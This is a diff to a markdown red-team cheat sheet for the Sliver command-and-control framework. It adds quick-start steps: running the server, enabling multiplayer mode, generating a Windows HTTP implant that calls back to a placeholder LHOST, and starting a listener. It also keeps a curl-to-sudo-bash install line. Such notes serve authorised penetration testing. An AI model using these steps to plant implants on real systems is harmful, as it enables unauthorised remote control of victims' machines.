@@ -260,36 +260,58 @@ $ cat .env
 
 > https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2
 
+> https://github.com/BishopFox/sliver/wiki/Beginner's-Guide
+
+> https://github.com/BishopFox/sliver/wiki/Getting-Started
+
 ### Installation
 
 ```c
 $ curl https://sliver.sh/install | sudo bash
 ```
 
-#### Alternatively via Snapcraft
+### Quick Start
+
+Download the latest `sliver-server` binary and execute it.
+
+> https://github.com/BishopFox/sliver/releases
 
 ```c
-$ sudo snap install sliver
-$ sliver.server
+$ ./sliver-server_linux 
+
+Sliver  Copyright (C) 2022  Bishop Fox
+This program comes with ABSOLUTELY NO WARRANTY; for details type 'licenses'.
+This is free software, and you are welcome to redistribute it
+under certain conditions; type 'licenses' for details.
+
+Unpacking assets ...
+[*] Loaded 20 aliases from disk
+[*] Loaded 104 extension(s) from disk
+
+    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
+    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
+    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
+    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
+    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
+    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
+
+All hackers gain evolve
+[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
+[*] Welcome to the sliver shell, please type 'help' for options
 ```
 
 ```c
-$ sliver
+[server] sliver > multiplayer
+
+[*] Multiplayer mode enabled!
 ```
 
-or
-
 ```c
-$ sudo snap start sliver
-$ sudo snap run sliver
+[server] sliver > generate --http <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/FOLDER/
 ```
 
-#### Start Sliver
-
 ```c
-$ sudo systemctl enable sliver.service
-$ sudo systemctl start sliver.service
-$ sliver
+[server] sliver > http
 ```
 
 ### Administration
@@ -302,12 +324,6 @@ sliver > armory install all
 ```
 
 ### Multiplayer
-
-#### Directory for Server Binary
-
-```c
-/root/sliver-server
-```
 
 #### Register a new Operator
 
